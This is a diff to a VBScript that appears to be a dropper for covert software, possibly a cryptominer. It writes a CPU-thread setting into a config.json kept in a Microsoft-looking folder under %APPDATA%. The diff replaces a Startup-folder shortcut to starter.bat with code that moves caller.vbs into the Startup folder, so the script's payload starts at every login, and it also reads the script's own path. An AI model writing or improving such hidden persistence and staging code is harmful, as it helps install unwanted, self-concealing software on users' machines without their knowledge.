@@ -1,7 +1,7 @@
 Option Explicit
 
 Dim objFSO, objShell, objWMI, colProcessors, objProcessor
-Dim threads, maxThreads, jsonFile, jsonContent, startupFolder, shortcutPath, starterBatPath
+Dim threads, maxThreads, jsonFile, jsonContent, startupFolder, callerVbsPath
 
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("WScript.Shell")
@@ -23,8 +23,7 @@ If maxThreads < 1 Then maxThreads = 1
 
 jsonFile = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\config.json")
 startupFolder = objShell.SpecialFolders("Startup")
-shortcutPath = startupFolder & "\starter.bat.lnk"  ' Shortcut for starter.bat
-starterBatPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\starter.bat")  ' Path to starter.bat
+callerVbsPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\caller.vbs")  ' Path to caller.vbs
 
 If Not objFSO.FileExists(jsonFile) Then
     MsgBox "config.json not found in the current directory. Exiting."
@@ -42,12 +41,10 @@ Set objFile = objFSO.OpenTextFile(jsonFile, 2, False)
 objFile.Write jsonContent
 objFile.Close
 
-' Create a shortcut to the starter.bat in the Startup folder
-Dim shortcut
-Set shortcut = objShell.CreateShortcut(shortcutPath)
-shortcut.TargetPath = starterBatPath
-shortcut.WorkingDirectory = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM")  ' Working directory for starter.bat
-shortcut.Save
+' Move caller.vbs to the Startup folder
+If objFSO.FileExists(callerVbsPath) Then
+    objFSO.MoveFile callerVbsPath, startupFolder & "\caller.vbs"
+End If
 
 Dim selfPath
 selfPath = WScript.ScriptFullName
